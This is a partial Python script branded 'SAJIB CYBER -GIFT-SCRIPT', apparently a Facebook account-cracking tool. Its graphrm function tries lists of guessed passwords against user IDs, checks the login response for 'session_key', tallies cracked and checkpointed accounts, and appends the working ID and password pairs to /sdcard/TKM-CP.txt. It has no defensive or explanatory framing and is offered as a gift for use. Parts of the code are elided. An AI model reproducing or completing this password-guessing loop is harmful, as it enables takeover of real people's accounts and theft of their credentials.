...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, SAJIB CYBER  "')
def logo():
...
##     ## ##     ##  ######  ##    ## 
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : SAJIB CYBER 
 [{G}+{W}] GIFT BY   :   SAJIB CYBER 
 [{G}+{W}] FACEBOOK :SAJIB CYBER 
 [{G}+{W}] YOU TUBE : SAJIB CYBER                      
...
############------[RANDOM USN SYSTEM SAJIB CYBER ]-------#########
lk=[]
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}SAJIB CYBER -GIFT-SCRIPT{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[SAJIB CYBER -GIFT-SCRIPT] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
